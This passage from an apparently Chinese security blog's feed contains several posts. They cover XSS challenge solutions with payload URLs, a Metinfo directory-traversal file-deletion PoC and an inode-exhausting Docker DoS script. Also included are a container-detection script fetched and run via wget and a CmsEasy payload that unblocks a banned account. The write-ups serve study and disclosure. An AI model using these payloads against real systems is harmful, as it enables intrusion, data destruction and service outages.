title="5.XSS-HIDDEN"></a>5.XSS-HIDDEN</h3><p><strong>源码文件</strong><br>xss14.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">'X-XSS-Protection:0'</span>);</span></span><br><span class="line"><span class="php">header(<span class="string">'Content-Type:text/html;charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-ua-compatible"</span> <span class="attr">content</span>=<span class="string">"IE=10"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">''</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'token'</span> <span class="attr">value</span>=<span class="string">'&lt;?php</span></span></span><br><span class="line"><span class="tag"><span class="string">  echo htmlspecialchars($_GET['</span><span class="attr">token</span>']); ?&gt;</span>'&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>参考<a href="https://www.waitalone.cn/xss-in-hidden-input-fields.html" target="_blank" rel="noopener">当XSS遇到input hidden属性</a>，利用accesskey在Firefox下成功执行,在Firefox下，使用ALT+SHIFT+X快捷键来触发XSS，请求URL如下：<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ec2<span class="string">-13</span><span class="string">-58</span><span class="string">-146</span><span class="string">-2</span>.us-east<span class="string">-2</span>.compute.amazonaws.com/xss14.php?token=123' accesskey='X' onclick='alert(document.domain)'//</span><br></pre></td></tr></table></figure></p><h3 id="6-XSS-passive-element"><a href="#6-XSS-passive-element" class="headerlink" title="6.XSS-passive element"></a>6.XSS-passive element</h3><p><strong>源码文件</strong><br>xss17.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php">header(<span class="string">"X-Content-Type-Options: nosniff"</span>);</span></span><br><span class="line"><span class="php">header(<span class="string">"X-FRAME-OPTIONS: DENY"</span>);</span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php">$content=$_GET[<span class="string">"content"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;div data-content='"</span>.htmlspecialchars($content).<span class="string">"'&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>参考<a href="https://html5sec.org/" target="_blank" rel="noopener">XSS without User Interaction from passive Elements</a>，可以在除了Firefox下的浏览器上非交互直接执行XSS代码<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ec2<span class="string">-13</span><span class="string">-58</span><span class="string">-146</span><span class="string">-2</span>.us-east<span class="string">-2</span>.compute.amazonaws.com/xss17.php?content=1' onfocus='alert(1)' contenteditable tabindex='0' id='xss</span><br></pre></td></tr></table></figure></p><p>朋友也提到使用上一题的accesskey也可以，但是只能在Firefox下，使用ALT+SHIFT+X快捷键来触发XSS<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ec2<span class="string">-13</span><span class="string">-58</span><span class="string">-146</span><span class="string">-2</span>.us-east<span class="string">-2</span>.compute.amazonaws.com/xss17.php?content=xss ' accesskey=X  onclick=alert(1) id='xss</span><br></pre></td></tr></table></figure></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>此处XSS挑战学习了很多的新姿势，但是有不少情况存在一定的局限性，要求特定浏览器、特定版本、操作系统等。当然作为技术交流，这次的挑战赛很赞。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近阿里先知论坛发起XSS挑战赛，记录一下自己做出的几道题的思路&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
      <category term="XSS" scheme="http://blackwolfsec.cc/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Metinfo最新版5.3.17后台目录遍历Bypass</title>
    <link href="http://blackwolfsec.cc/2017/07/20/Metinfo-directory-traversal-bypass/"/>
    <id>http://blackwolfsec.cc/2017/07/20/Metinfo-directory-traversal-bypass/</id>
    <published>2017-07-19T21:28:04.000Z</published>
    <updated>2017-07-21T06:30:49.026Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11500" target="_blank" rel="noopener">CVE-2017-11500</a>这个漏洞比较鸡肋，Metinfo最新版5.3.17后台某处目录遍历Bypass，可以删除任意zip文件。<br><a id="more"></a></p><h2 id="0x02漏洞详情"><a href="#0x02漏洞详情" class="headerlink" title="0x02漏洞详情"></a>0x02漏洞详情</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /admin/system/database/filedown.php</span></span><br><span class="line"><span class="keyword">if</span>($action==<span class="string">'delete'</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(substr_count(trim($filenames),<span class="string">'../'</span>))<span class="keyword">die</span>(<span class="string">'met2'</span>);</span><br><span class="line"><span class="keyword">if</span>(fileext($filenames)==<span class="string">'zip'</span>)&#123;</span><br><span class="line">@unlink(<span class="string">'../../databack/'</span>.$fileon.<span class="string">'/'</span>.$filenames);</span><br><span class="line">&#125;</span><br><span class="line">metsave($rurls,<span class="string">''</span>,$depth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检测如果$filenames包含<code>../</code>则直接退出，但是这个很容易利用<code>..\</code>即可Bypass，然后检测文件的后缀名如果是zip就直接删除文件，所以存在目录遍历删除任意的zip文件。<br>POC如下：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//localhost/MetInfo5.3/admin/system/database/filedown.php</span>?anyid=13&amp;action=delete&amp;filenames=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\test.zip&amp;fileon=web&amp;lang=cn</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/metinfo-1.jpg" alt="目录遍历"></p><h2 id="0x02小结"><a href="#0x02小结" class="headerlink" title="0x02小结"></a>0x02小结</h2><p><code>/admin/system/database/filedown.php</code>文件的<code>$filenames</code>参数存在目录遍历删除任意的zip文件，此处没有CSRF防护，可以结合CSRF漏洞利用。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11500&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CVE-2017-11500&lt;/a&gt;这个漏洞比较鸡肋，Metinfo最新版5.3.17后台某处目录遍历Bypass，可以删除任意zip文件。&lt;br&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://blackwolfsec.cc/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://blackwolfsec.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="CVE" scheme="http://blackwolfsec.cc/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Docker检测技术研究</title>
    <link href="http://blackwolfsec.cc/2017/07/11/docker-detection-technology/"/>
    <id>http://blackwolfsec.cc/2017/07/11/docker-detection-technology/</id>
    <published>2017-07-11T12:43:52.000Z</published>
    <updated>2017-07-12T01:11:50.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>随着Docker的广泛应用，获取一个云端服务器的控制权限之后，检测目标是一个真实机器还是在Docker容器环境中变得越来越重要<br><a id="more"></a></p><h2 id="0x01Docker检测"><a href="#0x01Docker检测" class="headerlink" title="0x01Docker检测"></a>0x01Docker检测</h2><p>Docker基于Linux的LXC提供虚拟化服务，为了对不同Docker容器（Container）进行有效的控制，需要在容器内初始化一些配置文件，因此，可以通过检测这类的配置文件检测是Docker容器内部还是在真实机器。</p><ul><li><p>基于/proc/self/cgroup内容是否包含”docker”的检测(左边Docker容器环境，右边真机环境)<br><img src="http://blackwolfsec.cc/static/picture/isdocker-1.jpg" alt="cgroup"></p></li><li><p>基于/proc/self/cpuset内容是否包含”docker”的检测(左边Docker容器环境，右边真机环境)<br><img src="http://blackwolfsec.cc/static/picture/isdocker-2.jpg" alt="cpuset"></p></li><li><p>基于是否包含存在”/.dockerenv”的检测(左边Docker容器环境，右边真机环境)<br><img src="http://blackwolfsec.cc/static/picture/isdocker-3.jpg" alt="dockerenv"></p></li></ul><h2 id="0x02检测脚本"><a href="#0x02检测脚本" class="headerlink" title="0x02检测脚本"></a>0x02检测脚本</h2><p>先看看检测效果(左边Docker容器环境，右边真机环境)</p><p><img src="http://blackwolfsec.cc/static/picture/isdocker-4.jpg" alt="isdocker"><br>源码如下，为了突出检测结果，增加了字体颜色修改<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">isDocker</span></span>()&#123;</span><br><span class="line"><span class="keyword">if</span> [ $(cat /proc/self/cgroup|grep -c <span class="string">"docker"</span>) -gt 1 ];</span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[31mThis is a Docker container\033[0m"</span>; </span><br><span class="line"><span class="keyword">elif</span> [ $(cat /proc/self/cpuset|grep -c <span class="string">"docker"</span>) -gt 1 ];</span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[31mThis is a Docker container\033[0m"</span>; </span><br><span class="line"><span class="keyword">elif</span> [  -f <span class="string">"/.dockerenv"</span> ];</span><br><span class="line"><span class="keyword">then</span>  </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[31mThis is a Docker container\033[0m"</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[34mThis is not a Docker container\033[0m"</span>;<span class="keyword">fi</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">isDocker</span><br></pre></td></tr></table></figure></p><p>使用方法<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://blackwolfsec.<span class="keyword">cc</span>/static/code/isDocker.<span class="keyword">sh</span> -O isDocker.<span class="keyword">sh</span> &amp;&amp; chmod +<span class="keyword">x</span> isDocker.<span class="keyword">sh</span>&amp;&amp; ./isDocker.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></p><p>如果不喜欢上面下载bash脚本的方式，也可以直接复制下面的命令到shell下执行检测<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ $(cat /proc/self/cgroup|grep -c <span class="string">"docker"</span>) -gt 1 || $(cat /proc/self/cpuset|grep -c <span class="string">"docker"</span>) -gt 1 ||  -f <span class="string">"/.dockerenv"</span>  ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">"\033[31mThis is a Docker container\033[0m"</span>;<span class="keyword">else</span> <span class="built_in">echo</span> -e <span class="string">"\033[34mThis is not a Docker container\033[0m"</span>;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03参考链接"><a href="#0x03参考链接" class="headerlink" title="0x03参考链接"></a>0x03参考链接</h2><ol><li><p><a href="http://tuhrig.de/how-to-know-you-are-inside-a-docker-container/" target="_blank" rel="noopener">http://tuhrig.de/how-to-know-you-are-inside-a-docker-container/</a></p></li><li><p><a href="https://github.com/sindresorhus/is-docker/blob/master/index.js" target="_blank" rel="noopener">https://github.com/sindresorhus/is-docker/blob/master/index.js</a></p></li><li><p><a href="https://forums.docker.com/t/how-can-a-process-detect-if-it-is-running-in-a-container/11123" target="_blank" rel="noopener">https://forums.docker.com/t/how-can-a-process-detect-if-it-is-running-in-a-container/11123</a></p></li><li><a href="https://github.com/pipedrive/containerized" target="_blank" rel="noopener">https://github.com/pipedrive/containerized</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;随着Docker的广泛应用，获取一个云端服务器的控制权限之后，检测目标是一个真实机器还是在Docker容器环境中变得越来越重要&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
      <category term="Docker" scheme="http://blackwolfsec.cc/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Docker拒绝服务攻击之Inode</title>
    <link href="http://blackwolfsec.cc/2017/07/06/docker-dos-attack-inode/"/>
    <id>http://blackwolfsec.cc/2017/07/06/docker-dos-attack-inode/</id>
    <published>2017-07-06T11:51:29.000Z</published>
    <updated>2017-07-06T13:16:24.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>Docker在各领域的应用越来越广泛，最近在分析Docker安全的相关内容，分享一个由于Inode导致的Docker拒绝服务攻击。<br><a id="more"></a></p><h2 id="0x01Inode简介及Docker安全"><a href="#0x01Inode简介及Docker安全" class="headerlink" title="0x01Inode简介及Docker安全"></a>0x01Inode简介及Docker安全</h2><p>1.Inode负责Linux文件系统中存储文件的信息，包括文件名、创建日期等，更加详细的介绍参考<a href="http://www.ruanyifeng.com/blog/2011/12/inode.html" target="_blank" rel="noopener">理解inode</a>，这里我们只关注在Linux文件系统中，每个文件需要有对应的Inode，而且Inode是一种有限的资源（类比：端口号只有65535个），如果Inode被使用完毕，即使磁盘还有剩余空间也无法建立新的文件，导致需要新建文件的服务无法正常运行。</p><p>2.众所周知，Docker利用Linux内核的Namespace、Capability、CGroup以及SELinux等提供系统层面的虚拟化服务，提供相比于传统的虚拟机（VM）技术更加轻量级的隔离容器（Container）服务。然而正由于多个容器共用一个底层操作系统，有些隔离措施的缺陷会导致Docker存在一定的安全风险。如果在一个容器内不断创建新的文件，就会把宿主机（真实主机）的文件系统的Inode消耗完毕，导致其他容器无法新建文件，导致服务异常，而且宿主机也不能新建其他容器，导致拒绝服务攻击。</p><h2 id="0x02实践过程"><a href="#0x02实践过程" class="headerlink" title="0x02实践过程"></a>0x02实践过程</h2><p>测试环境：</p><ul><li>Docker version 17.03.1-ce</li><li>Ubuntu 16.04</li><li>20G SSD腾讯云主机</li></ul><p>利用<code>Docker run -it tutum/lamp /bin/bash</code>启动容器，并获取bash命令shell<br>新建bash文件，实现循环新建空文件，消耗Inode资源，详细内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    i=$((<span class="variable">$i</span>+1));</span><br><span class="line">    touch <span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>运行脚本等待一段时间，提示<code>No space left on device</code></p><p><img src="http://blackwolfsec.cc/static/picture/docker-dos-inode-1.png" alt="No space left on device"></p><p>此时在宿主机上用<code>df -i</code>命令查看Inode使用100%，于是所有的Inode资源被消耗完</p><p><img src="http://blackwolfsec.cc/static/picture/docker-dos-inode-2.png" alt="查看Inode使用情况"></p><p>如果尝试新建容器的失败，提示<code>no space left on device</code></p><p><img src="http://blackwolfsec.cc/static/picture/docker-dos-inode-3.png" alt="enter description here"></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>Docker的不同容器共享同一个宿主机，虽然Docker有很多的安全隔离机制，但是有些资源的隔离存在缺陷。如果其中一个容器消耗完Inode资源会导致其他容器需要新建文件的所有功能异常，也会导致宿主机的功能异常，达到针对其他容器和宿主机的拒绝服务攻击。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;Docker在各领域的应用越来越广泛，最近在分析Docker安全的相关内容，分享一个由于Inode导致的Docker拒绝服务攻击。&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
      <category term="Docker" scheme="http://blackwolfsec.cc/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>CmsEasy会员编辑资料安全性分析</title>
    <link href="http://blackwolfsec.cc/2017/06/01/cmseasy-security-1/"/>
    <id>http://blackwolfsec.cc/2017/06/01/cmseasy-security-1/</id>
    <published>2017-06-01T07:53:20.000Z</published>
    <updated>2017-06-17T01:17:31.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近一段时间尝试研究CmsEasy的安全性，分析了一下“会员编辑资料”功能的小问题。<br><a id="more"></a></p><h2 id="0x01会员编辑资料安全分析"><a href="#0x01会员编辑资料安全分析" class="headerlink" title="0x01会员编辑资料安全分析"></a>0x01会员编辑资料安全分析</h2><p>ps:<em>front::$post进行了一些XSS、SQL等过滤，另外还有360Web防火墙，所以此处不关注这些漏洞，关注逻辑问题</em><br>会员中心-&gt;编辑资料<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//D:\wamp64\www\cmseasy_5.6\lib\default\user_act.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_action</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (front::post(<span class="string">'submit'</span>)) &#123;</span><br><span class="line">        <span class="keyword">unset</span>(front::$post[<span class="string">'username'</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(front::$post[<span class="string">'groupid'</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(front::$post[<span class="string">'powerlist'</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(front::$post[<span class="string">'password'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!is_email(front::$post[<span class="string">'e_mail'</span>])) &#123;</span><br><span class="line">            alerterror(lang(<span class="string">'mailbox_format_is_not'</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (front::$post <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($v) &amp;&amp; !<span class="keyword">empty</span>($v)) &#123;</span><br><span class="line">                front::$post[$k] = implode(<span class="string">','</span>, $v);</span><br><span class="line">            &#125;</span><br><span class="line">            front::check_type(front::post($k), <span class="string">'safe'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_user-&gt;rec_update(front::$post, <span class="string">"username='"</span>.session::get(<span class="string">'username'</span>).<span class="string">"'"</span>);</span><br><span class="line">        <span class="comment">//var_dump(front::$post);</span></span><br><span class="line">        front::flash(lang(<span class="string">'modify_data_successfully'</span>));</span><br><span class="line">        front::redirect(url::create(<span class="string">'user/index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;data = <span class="keyword">$this</span>-&gt;view-&gt;user;</span><br><span class="line">    <span class="comment">//var_dump($this-&gt;view-&gt;data);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>edit_action函数删除POST数据包中的username、groupid、powerlist、password字段，接着遍历POST数据，检测安全性，赋值后，调用$this-&gt;_user-&gt;rec_update更新数据库（这里考虑到PHP unset区分大小写，而Mysql不区分大小写，起初认为通过大小写绕过groupid的unset，直接提权为管理员，然而事与愿违……）<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> rec_update(<span class="variable">$row</span>,<span class="variable">$where</span>) &#123;</span><br><span class="line">    <span class="variable">$tbname</span>=<span class="variable">$this</span>-&gt;name;</span><br><span class="line">    <span class="variable">$sql</span>=<span class="variable">$this</span>-&gt;sql_update(<span class="variable">$tbname</span>,<span class="variable">$row</span>,<span class="variable">$where</span>);</span><br><span class="line">    <span class="regexp">//</span>echo <span class="variable">$sql</span>.<span class="string">"&lt;br&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">    return <span class="variable">$this</span>-&gt;query_unbuffered(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>rec_update函数调用sql_update函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//D:\wamp64\www\cmseasy_5.6\lib\inc\table.php</span><br><span class="line"><span class="keyword">function</span> sql_update(<span class="variable">$tbname</span>,<span class="variable">$row</span>,<span class="variable">$where</span>) &#123;</span><br><span class="line">    //var_dump(<span class="variable">$row</span>);</span><br><span class="line">    <span class="variable">$sqlud</span>=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$row</span>))</span><br><span class="line">        <span class="variable">$sqlud</span> = <span class="variable">$row</span>.<span class="string">' '</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        foreach (<span class="variable">$row</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$key</span>,explode(<span class="string">','</span>,<span class="variable">$this</span>-&gt;getcolslist()))) &#123;</span><br><span class="line">                <span class="variable">$value</span>=<span class="variable">$value</span>;</span><br><span class="line">                /*<span class="keyword">if</span> (preg_match(<span class="string">'/^\[(.*)\]$/'</span>,<span class="variable">$value</span>,<span class="variable">$match</span>))</span><br><span class="line">                    <span class="variable">$sqlud</span> .= <span class="string">"`<span class="variable">$key</span>`"</span>.<span class="string">"= '"</span>.<span class="variable">$match</span>[1].<span class="string">"',"</span>;</span><br><span class="line">                <span class="keyword">else</span>*/<span class="keyword">if</span> (<span class="variable">$value</span> === <span class="string">""</span>)</span><br><span class="line">                    <span class="variable">$sqlud</span> .= <span class="string">"`<span class="variable">$key</span>`= NULL, "</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="variable">$sqlud</span> .= <span class="string">"`<span class="variable">$key</span>`"</span>.<span class="string">"= '"</span>.<span class="variable">$value</span>.<span class="string">"',"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="variable">$sqlud</span>=rtrim(<span class="variable">$sqlud</span>);</span><br><span class="line">    <span class="variable">$sqlud</span>=rtrim(<span class="variable">$sqlud</span>,<span class="string">','</span>);</span><br><span class="line">    <span class="variable">$this</span>-&gt;condition(<span class="variable">$where</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">"UPDATE `"</span>.<span class="variable">$tbname</span>.<span class="string">"` SET "</span>.<span class="variable">$sqlud</span>.<span class="string">" WHERE "</span>.<span class="variable">$where</span>;</span><br><span class="line">    //<span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>sql_update函数调用$this-&gt;getcolslist()返回数据库中表的列名，接着用in_array判断字段名$key是否包含于数据库表的列名数组之内，如果不在数组之内直接忽略该字段。（in_array区分大小写，所以即使绕过了unset函数，也不能成功update数据库的username、groupid、powerlist、password字段）<br><strong>不能提权利用，但是由于遍历POST数据后update操作，存在其他的安全问题，可以修改数据库中原本没有权限直接修改的数据，比如：isblock、isdelete、checked、userip等</strong><br>例如：管理员在后台“冻结”并”清退”了test用户，该用户登录后修改资料，POST添加<code>isblock=0&amp;isdelete=0</code>数据包即可解除“冻结”和”清退”状态，payload如下:<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test<span class="variable">&amp;nickname</span>=<span class="number">123</span><span class="variable">&amp;question</span>=<span class="variable">&amp;isblock</span>=<span class="number">0</span><span class="variable">&amp;isdelete</span>=<span class="number">0</span><span class="variable">&amp;answer</span>=<span class="variable">&amp;qq</span>=<span class="number">1111111111</span><span class="variable">&amp;e_mail</span>=test%<span class="number">40</span>test.com<span class="variable">&amp;tel</span>=<span class="number">18702111</span><span class="variable">&amp;address</span>=<span class="number">123123</span><span class="variable">&amp;intro</span>=<span class="number">123123</span><span class="variable">&amp;submit</span>=%E6%<span class="number">8F</span>%<span class="number">90</span>%E4%BA%A4</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
